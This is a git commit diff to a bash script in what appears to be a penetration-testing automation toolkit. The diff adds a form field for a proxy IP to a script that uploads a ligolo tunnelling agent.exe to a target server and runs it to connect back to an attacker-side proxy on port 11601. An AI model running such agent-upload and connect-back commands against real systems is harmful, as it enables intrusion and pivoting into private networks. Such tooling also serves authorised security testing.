23e2b9aba7b7b0726350a936055b1b40d8447e9f
Danny van der Knaap <dannyvdknaap@gmail.com>
2025-04-06 14:10:59 +0200

    feat(bash): new scripts

--- code/xdotool/scripts/portListening/ligolo/cmd_upload_ligolo_agent_exe.sh
+++ code/xdotool/scripts/portListening/ligolo/cmd_upload_ligolo_agent_exe.sh
@@ -4,10 +4,18 @@
 cmd: download ligolo agent.exe to server and connect to proxy
 '
 
+# Generate GUI form items (label, type (optional: default text), name, default (optional))
+PROXY_IP_FIELD=$(form_item  "proxy ip" "proxy_ip" "${KALI_IP}")
+
+# Generate GUI form
+generate_form "${PROXY_IP_FIELD}"
+
+PROXY_IP=${form_data["proxy_ip"]}
+
 LOCATION="${SCRIPTS_DIR}/portListening/ligolo/.files"
 FILE="agent.exe"
 
 cmd_upload_file "${LOCATION}" "${FILE}"
 
-execute_command "${FILE_LOCATION} -connect ${KALI_IP}:11601 -ignore-cert"
+execute_command "${FILE_LOCATION} -connect ${PROXY_IP}:11601 -ignore-cert"
 create_new_line
